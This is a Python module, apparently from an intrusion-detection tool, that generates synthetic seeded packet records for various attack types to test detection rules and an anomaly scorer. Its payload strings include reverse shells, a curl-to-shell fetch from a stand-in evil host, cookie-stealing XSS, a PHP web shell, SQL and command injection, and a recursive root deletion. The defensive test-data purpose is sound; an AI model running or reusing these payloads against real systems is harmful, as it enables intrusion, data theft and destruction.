"""Deterministic synthetic network-packet generator for the IDS module.

Produces realistic packet records (headers, protocol, ports, TCP flags, TTL,
payload bytes and a hex/ASCII dump) for every attack type in the catalog. The
output feeds both the multi-layer rules engine and the ML anomaly scorer, so
the packets carry genuine statistical structure (port fan-out, inter-arrival
cadence, payload entropy) rather than being labelled directly from the catalog.

Generation is seeded for reproducibility, which enables the frontend
"comparison mode" to re-run identical payloads side-by-side.
"""
from __future__ import annotations

import base64
import random
import string
from datetime import datetime, timedelta, timezone
from typing import Any, Callable, Dict, List, Optional

from app.services.ids.attack_catalog import get_attack

# ---------------------------------------------------------------------------
# Volume profiles: how Traffic Volume (low/medium/high) reshapes timing and
# fan-out. High volume compresses inter-arrival times and multiplies sources.
# ---------------------------------------------------------------------------
VOLUME_PROFILE: Dict[str, Dict[str, float]] = {
    "low": {"rate_scale": 0.35, "jitter": 1.6, "source_fanout": 1},
    "medium": {"rate_scale": 1.0, "jitter": 1.0, "source_fanout": 2},
    "high": {"rate_scale": 3.5, "jitter": 0.4, "source_fanout": 6},
}

_AUTH_USERS = ["admin", "root", "jsmith", "finance_user", "svc_backup", "it_helpdesk", "ceo"]
_DIC_WORDS = ["password", "123456", "welcome", "letmein", "qwerty", "admin", "iloveyou", "dragon"]


def _rand_ip(rng: random.Random, private: bool = True) -> str:
    if private:
        return f"10.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"
    return f"{rng.randint(1, 223)}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"


def _rand_mac(rng: random.Random) -> str:
    return ":".join(f"{rng.randint(0, 255):02x}" for _ in range(6))


def _word_list(rng: random.Random, n: int) -> List[str]:
    return ["".join(rng.choices(string.ascii_lowercase, k=rng.randint(3, 8))) for _ in range(n)]


def _high_entropy_bytes(rng: random.Random, n: int) -> bytes:
    return bytes(rng.getrandbits(8) for _ in range(n))


# ---------------------------------------------------------------------------
# Payload content builders: return (text_preview, raw_bytes)
# ---------------------------------------------------------------------------
def _build_content(style: str, rng: random.Random, idx: int, attack: Dict[str, Any]) -> tuple[str, bytes]:
    if style == "empty":
        return "", b""
    if style == "icmp_echo":
        t = f"ICMP echo request id={idx} seq={idx} data=" + "".join(rng.choices(string.ascii_letters, k=16))
        return t, t.encode()
    if style == "syn_options":
        t = f"TCP SYN win={rng.choice([1024, 65535, 1460])} opts=MSS,SAOK,WScale"
        return t, t.encode()
    if style == "banner":
        t = rng.choice([
            "SSH-2.0-OpenSSH_8.9p1 Ubuntu",
            "220 (vsFTPd 3.0.5)",
            "HTTP/1.1 200 OK Server: Apache/2.4.41",
            "530 Login incorrect.",
        ])
        return t, (t + "\r\n").encode()
    if style == "auth_attempt":
        u = rng.choice(_AUTH_USERS[:2])
        t = f'POST /login HTTP/1.1  user="{u}" pass="{_DIC_WORDS[idx % len(_DIC_WORDS)]}" status=401'
        return t, t.encode()
    if style == "auth_spray":
        u = _AUTH_USERS[idx % len(_AUTH_USERS)]
        t = f'POST /login HTTP/1.1  user="{u}" pass="Winter2026!" status=401'
        return t, t.encode()
    if style == "auth_dict":
        t = f'POST /login HTTP/1.1  user="admin" pass="{_DIC_WORDS[idx % len(_DIC_WORDS)]}" status=401'
        return t, t.encode()
    if style == "session_token":
        tok = "".join(rng.choices(string.hexdigits.lower(), k=32))
        t = f"GET /account HTTP/1.1  Cookie: sessionid={tok}"
        return t, t.encode()
    if style == "bearer_replay":
        tok = base64.b64encode(f"sub=u{idx}".encode()).decode()
        t = f"GET /api/me HTTP/1.1  Authorization: Bearer eyJ.{tok}.sig"
        return t, t.encode()
    if style == "sqli_union":
        t = "GET /item?id=1%27%20UNION%20SELECT%20username,password,NULL%20FROM%20users--"
        return t, t.encode()
    if style == "sqli_blind":
        cond = "1=1" if idx % 2 == 0 else "1=2"
        t = f"GET /item?id=1%27%20AND%20{cond}--"
        return t, t.encode()
    if style == "sqli_time":
        t = "GET /item?id=1;WAITFOR%20DELAY%20'0:0:5'--"
        return t, t.encode()
    if style == "cmd_inject":
        t = rng.choice([
            ";cat /etc/passwd",
            "|/bin/bash -c 'nc -e /bin/sh 10.0.0.5 4444'",
            ";rm -rf / --no-preserve-root",
            "`whoami`.cmd",
        ])
        return t, t.encode()
    if style == "ldap_inject":
        t = "GET /search?u=*)(uid=*))(|(uid=*"
        return t, t.encode()
    if style in ("xss_reflect", "xss_stored", "xss_dom"):
        t = rng.choice([
            "GET /q=<script>alert(document.cookie)</script>",
            "<img src=x onerror=fetch('//evil/c?'+document.cookie)>",
            "javascript:eval(atob('YWxlcnQoMSk='))",
        ])
        return t, t.encode()
    if style == "xxe":
        t = '<?xml?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>'
        return t, t.encode()
    if style == "udp_noise":
        b = _high_entropy_bytes(rng, rng.randint(40, 200))
        return "<udp datagram>", b
    if style == "http_get":
        path = rng.choice(["/", "/index.html", "/api/products", "/cart", "/search"])
        t = f"GET {path} HTTP/1.1  Host: shop.example.com  User-Agent: Mozilla/5.0"
        return t, t.encode()
    if style == "slowloris":
        t = f"GET / HTTP/1.1\r\nX-a: {rng.randint(1, 9999)}"  # never terminated
        return t, t.encode()
    if style == "dns_amplify":
        t = f"DNS query TXT ANY big.{_word_list(rng, 1)[0]}.example.com"
        return t, t.encode()
    if style == "arp_reply":
        t = f"ARP opcode=reply sha={_rand_mac(rng)} spa={_rand_ip(rng)} tha={_rand_mac(rng)}"
        return t, t.encode()
    if style == "dns_response_spoof":
        t = f"DNS answer A bank.example.com -> {_rand_ip(rng, False)} (anscount=1)"
        return t, t.encode()
    if style == "mitm_relay":
        t = f"TLS record (relayed) len={rng.randint(60, 200)} subject=CN=*.example.com issuer=EVIL"
        return t, t.encode()
    if style == "reverse_shell":
        t = rng.choice([
            "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
            "nc -e /bin/sh 10.0.0.5 4444",
            "python -c 'import socket,subprocess;s.connect((\"10.0.0.5\",4444))'",
        ])
        return t, t.encode()
    if style == "encoded":
        raw = "curl http://evil.sh | sh"
        t = "eval(base64_decode('%s'))" % base64.b64encode(raw.encode()).decode()
        return t, t.encode()
    if style == "multipart_upload":
        t = ('POST /upload HTTP/1.1 Content-Disposition: form-data; name="file"; '
             'filename="shell.php" <?php system($_GET["c"]); ?>')
        return t, t.encode()
    if style == "polymorphic":
        b = _high_entropy_bytes(rng, rng.randint(80, 400))  # shifting bytes, no static keyword
        return "<polymorphic blob>", b
    if style == "c2_beacon":
        xor = "".join(format(rng.getrandbits(4), "x") for _ in range(24))
        t = f"POST /gate.php HTTP/1.1 X-Session: {xor}"
        return t, t.encode()
    if style == "ip_fragment":
        off = (idx % 3) * 100
        t = f"IP fragment offset={off} MF=1 proto=TCP"
        return t, t.encode()
    if style == "tls_high_entropy":
        b = _high_entropy_bytes(rng, rng.randint(150, 600))
        return "<tls app data (high entropy)>", b
    if style == "dns_tunnel":
        label = base64.b32encode(_high_entropy_bytes(rng, rng.randint(20, 60))).decode().rstrip("=")
        t = f"DNS query {label[:50]}.tunnel.evil.com"
        return t, t.encode()
    if style == "icmp_data":
        b = _high_entropy_bytes(rng, rng.randint(60, 300))
        return f"ICMP echo id={idx} (data {len(b)}b)", b
    if style == "benign_http":
        if idx % 2 == 0:
            t = "GET /index.html HTTP/1.1  Host: www.example.com"
        else:
            t = "DNS query A www.example.com"
        return t, t.encode()
    # default
    t = f"payload seq={idx}"
    return t, t.encode()


def _hexdump(data: bytes, max_bytes: int = 256) -> str:
    """Return a classic 16-byte-per-line hex+ASCII dump (bounded)."""
    lines = []
    view = data[:max_bytes]
    for offset in range(0, len(view), 16):
        chunk = view[offset:offset + 16]
        hexpart = " ".join(f"{b:02x}" for b in chunk)
        asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"{offset:08x}  {hexpart:<47}  {asc}")
    if len(data) > max_bytes:
        lines.append(f"{max_bytes:08x}  ... ({len(data) - max_bytes} more bytes)")
    return "\n".join(lines) if lines else ""


def _synthetic_header_bytes(rng: random.Random, ttl: int, protocol: str) -> bytes:
    """A small but plausible L3/L4 header prefix so the hex view has structure."""
    ver_ihl = 0x45
    tot_len = rng.randint(40, 100)
    return bytes([
        ver_ihl, 0x00, (tot_len >> 8) & 0xff, tot_len & 0xff,
        rng.randint(0, 255), rng.randint(0, 255), 0x00, rng.randint(0x40, 0x4f),
        ttl, {"TCP": 6, "UDP": 17, "ICMP": 1, "ARP": 100}.get(protocol, 6),
        0x00, 0x00,
    ])


def generate_packets(
    attack_id: str,
    packet_count: int = 20,
    volume: str = "medium",
    seed: Optional[int] = None,
    start_time: Optional[datetime] = None,
) -> Dict[str, Any]:
    """Generate a realistic packet stream for the given attack type.

    Returns a dict with the packet list plus a small generation summary that
    downstream engines and the UI can reference.
    """
    attack = get_attack(attack_id)
    profile = attack["profile"]
    rng = random.Random(seed)
    vol = VOLUME_PROFILE.get(volume, VOLUME_PROFILE["medium"])

    packet_count = max(1, min(500, int(packet_count)))
    start = start_time or datetime.now(timezone.utc)

    dst_ports: List[int] = profile.get("dst_ports", [80])
    protocol = profile.get("protocol", "TCP")
    flags = profile.get("flags", "SYN")
    base_ttl = profile.get("ttl", 64)
    size_lo, size_hi = profile.get("size", (40, 60))
    rate = max(0.1, profile.get("rate", 10)) * vol["rate_scale"]
    mean_gap = 1.0 / rate  # seconds between packets
    style = profile.get("payload_style", "empty")
    spoof = bool(profile.get("spoof_src", False))

    # Beacon style uses a fixed interval with jitter for periodicity
    beacon_interval = profile.get("beacon_interval_s")

    # Source/target pools
    dst_ip = _rand_ip(rng)
    fixed_src = _rand_ip(rng)
    src_pool = [fixed_src if profile.get("src_port_mode") == "fixed" and not spoof
                else _rand_ip(rng, private=not spoof) for _ in range(max(1, int(vol["source_fanout"])))]

    packets: List[Dict[str, Any]] = []
    t = start
    for idx in range(packet_count):
        if beacon_interval:
            step = (beacon_interval + rng.uniform(-2, 2))
        else:
            step = max(0.001, rng.gauss(mean_gap, mean_gap * 0.4 * vol["jitter"]))
        t = t + timedelta(seconds=step)

        src_ip = rng.choice(src_pool)
        if profile.get("src_port_mode") == "fixed":
            src_port = 49152
        elif profile.get("src_port_mode") == "ephemeral":
            src_port = rng.randint(49152, 65535)
        else:
            src_port = rng.randint(1024, 65535)

        dst_port = dst_ports[idx % len(dst_ports)]
        ttl = max(1, base_ttl + rng.randint(-4, 2))
        text, payload_bytes = _build_content(style, rng, idx, attack)
        header = _synthetic_header_bytes(rng, ttl, protocol)
        packet_bytes = header + payload_bytes
        size = max(size_lo, min(size_hi, len(packet_bytes)))

        packets.append({
            "index": idx,
            "timestamp": t.isoformat(),
            "unix_ts": t.timestamp(),
            "protocol": protocol,
            "src_ip": src_ip,
            "dst_ip": dst_ip,
            "src_port": src_port,
            "dst_port": dst_port,
            "flags": flags,
            "ttl": ttl,
            "size": size,
            "payload_text": text,
            "payload_sample_hex": payload_bytes[:64].hex(),
            "hex": _hexdump(packet_bytes),
        })

    return {
        "attack_id": attack_id,
        "attack_name": attack["name"],
        "category": attack["category"],
        "volume": volume,
        "seed": seed,
        "generated_count": len(packets),
        "packets": packets,
    }
